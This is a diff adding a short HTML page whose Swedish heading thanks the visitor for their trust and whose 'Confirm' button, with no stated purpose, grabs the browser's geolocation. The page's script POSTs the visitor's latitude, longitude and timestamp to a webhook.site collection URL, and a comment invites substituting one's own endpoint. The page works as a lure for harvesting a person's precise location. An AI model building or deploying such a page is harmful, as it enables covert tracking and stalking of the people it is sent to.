@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Location Share</title>
+</head>
+<body>
+  <h2>Tack för att du litar på oss – det betyder mycket.</h2>
+  <button onclick="shareLocation()">Bekräfta</button>
+
+  <script>
+    function shareLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async function(position) {
+          const data = {
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            timestamp: new Date().toISOString()
+          };
+
+          // Replace this URL with your own webhook, backend, or service
+          await fetch('https://webhook.site/26afdcae-0479-49a8-ae03-88cd64a0d9cd', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+          });
+
+          alert("Thank you! Your location has been sent.");
+        }, function(error) {
+          alert("Location access denied or error occurred.");
+        });
+      } else {
+        alert("Geolocation is not supported by your browser.");
+      }
+    }
+  </script>
+</body>
+</html>
